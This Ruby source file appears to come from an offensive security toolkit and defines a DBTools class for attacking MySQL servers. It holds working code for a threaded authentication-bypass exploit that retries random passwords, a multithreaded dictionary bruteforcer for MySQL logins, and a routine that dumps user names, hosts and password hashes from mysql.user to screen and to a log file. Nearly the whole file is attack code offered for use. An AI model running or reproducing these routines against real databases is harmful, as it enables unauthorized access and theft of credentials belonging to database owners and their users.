# Database Tools
# Connection Testers, Login Bruteforcers, etc...
# Make available from ui_dbtools_menu.rb where possible

class DBTools
  def initialize
    # Should we accept connection vars and dbtool type and then route?
    # leaving blank for now and handling with each function as needed...
  end

  # Check if login is successful using provided credentials
  # if success it returns mysql connection object for further re-use, nil on failures
  def mysql_can_we_connect(host='127.0.0.1', port=3306, user='root', pass=nil, db=nil)
    begin
      db_connection = Mysql.connect(host, user, pass, db, port)
      @host=host; @port=port; @user=user; @pass=pass; @db=db;
      return db_connection
    rescue Mysql::Error => e
      db_connection.close if db_connection
      print_error("Connection Problem!")
      print_error("#{e}")
      return nil
    end
  end

  # Run HR's Homebrew Hacker Friendly MySQL-Fu Client
  def mysql_fu(host='127.0.0.1', user='root', pass=nil, db=nil, port=3306)
    trap("SIGINT") {
      print_error("CTRL+C! Returning to Previous Menu....")
      return
    }
    db_connection = mysql_can_we_connect(host, port.to_i, user, pass, db)
    if not db_connection.nil?
      db_connection.close if db_connection
      mysql_connection = MySQLc.new(@host, @port.to_i, @user, @pass, @db)
      mysql_connection.get_basics
      mysql_connection.show_mycon_usage
      mysql_connection.mycon_shell
    end
  end

  # Perform threaded login checks until bypassed or exhausted
  # Largely modeled off the MSF Auxiliary Module & HDM's Blog Writeup
  def mysql_auth_bypass(host='127.0.0.1', port='3306', user='root')
    trap("SIGINT") {
      print_error("CTRL+C! Returning to Previous Menu....")
      return
    }
    results=[]
    max_threads = 16
    cur_threads = []
    queue = [*(1 .. 1000)]
    password=randz(rand(8)+1) # Random String for Pass, it doesn't really matter
    print_status("Starting MySQL Auth Bypass Exploit, hang tight......")
    while(queue.length > 0)
      while(cur_threads.length < max_threads)
        break if results.length > 0
        item = queue.shift # Pop one each iteration
        break if not item
        print "\r#{item/10}%".white if (item % 100) == 0
        t = Thread.new(item) do |count|
          begin
            db_connection = Mysql.connect(host, user, password, nil, port.to_i)
            @host=host; @port=port; @user=user; @pass=pass; @db=nil;
            results << db_connection
          rescue Mysql::Error
            # Do nothing, we dont give a hoot
          end
        end
        cur_threads << t
      end
      break if results.length > 0 # It worked!
      # Add to a list of dead threads if we're finished, then delete them
      cur_threads.each_index do |ti|
        t = cur_threads[ti]
        if not t.alive?
          cur_threads[ti] = nil
        end
      end
      cur_threads.delete(nil)
      sleep(0.25)
    end
    # Clean up any remaining threads & report findings
    cur_threads.each {|x| x.kill }
    if results.length > 0
      mysql_hashes(results.first)
    else
      print_error("Unable to Bypass Authentication!")
    end
  end

  # Loads Dictionary array then attempts each
  # Stops on success and attempts to dump passwords from mysql.user
  # Exhausts itself when runs out of passwords and gives up
  def mysql_login_check(host='127.0.0.1', port=3306, user='root', password=['toor'], db=nil)
    trap("SIGINT") {
      print_error("CTRL+C! Returning to Previous Menu....")
      return
    }
    pad=' '*15
    results=[]
    max_threads = 16
    cur_threads = []
    queue = [*(1 .. password.size)]
    sizer=password.size
    print_status("Loaded #{sizer} passwords")
    print_status("Starting MySQL Login Checker now, hang tight......")
    while(queue.length > 0)
      while(cur_threads.length < max_threads)
        break if results.length > 0
        item = queue.shift # Shift/Pop one each iteration
        break if not item
        print "\r(#{(item/100).to_f}%)> #{password[-1].chomp}".white + pad
        t = Thread.new(item) do |count|
          begin
            db_connection = Mysql.connect(host, user, password[-1].chomp, db, port.to_i)
            @host=host; @port=port.to_i; @user=user; @pass=password[-1].chomp; @db=db;
            results << db_connection
          rescue Mysql::Error
            password.pop # Pop and try again
          end
        end
        cur_threads << t
      end
      break if results.length > 0
      # Add to a list of dead threads if we're finished, then delete them
      cur_threads.each_index do |ti|
        t = cur_threads[ti]
        if not t.alive?
          cur_threads[ti] = nil
        end
      end
      cur_threads.delete(nil)
      sleep(0.25)
    end
    # Clean up any remaining threads & report findings
    cur_threads.each {|x| x.kill }
    print_line("")
    if results.length > 0
      mysql_hashes(results.first)
    else
      print_error("Unable to find any valid credentials!")
      print_error("Sorry, you can try once more to be sure....")
    end
  end

  # Dump the MySQL User Hashes
  def mysql_hashes(db_connection)
    logdir = RESULTS + 'dbtools/'
    logfile = logdir + @host + '-' + @user + '_mysql_hash_dump.txt'
    print_line("")
    print_good("w00t - Successfully Authenticated!")
    print_good("Host: #{@host}:#{@port}")
    print_good("User: #{@user}")
    print_good("Pass: #{@pass}")
    print_good("DB: #{@db}") unless @db.nil?
    print_line("")
    print_status("Dumping MySQL User & Password Hashes....")
    begin
      query = db_connection.query("SELECT COUNT(user) FROM mysql.user;")
      query.each { |x| @entries=x[0] }
      count=0
      columns = ['user', 'host', 'password']
      data=[] # Array of Arrays for table later
      data << columns
      while count.to_i < @entries.to_i
        row_data = []
        columns.each do |col|
          query = db_connection.query("SELECT #{col} FROM mysql.user limit #{count},1;")
          @result=''
          query.each { |x| @result+=x[0] }
          if @result.nil? or @result == ''
            row_data << 'NULL'
	  else
            row_data << @result
          end
        end
        data << row_data unless row_data.empty?
        count = count.to_i + 1
      end
      if data.size == 1
        print_error("Unkonwn Problem Dumping Hashes! Privs?")
      else
        Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
        f=File.open(logfile, 'w+')
        f.puts "w00t - Successfully Authenticated!"
        f.puts "Host: #{@host}:#{@port}"
        f.puts "User: #{@user}"
        f.puts "Pass: #{@pass}"
        f.puts "DB: #{@db}" unless @db.nil?
        f.puts ''
        f.puts "MySQL User & Passwords: "
        print_good("MySQL User & Passwords: ")
        table = data.to_table(:first_row_is_head => true)
        f.puts table.to_s
        @passwords=table.to_s
        print_line("#{@passwords}")
        db_connection.close if db_connection
        f.close
      end
    rescue Mysql::Error => e
      print_error("Problem dumping hashes!")
      print_error("#{e}")
      print_line("")
    end
  end
end
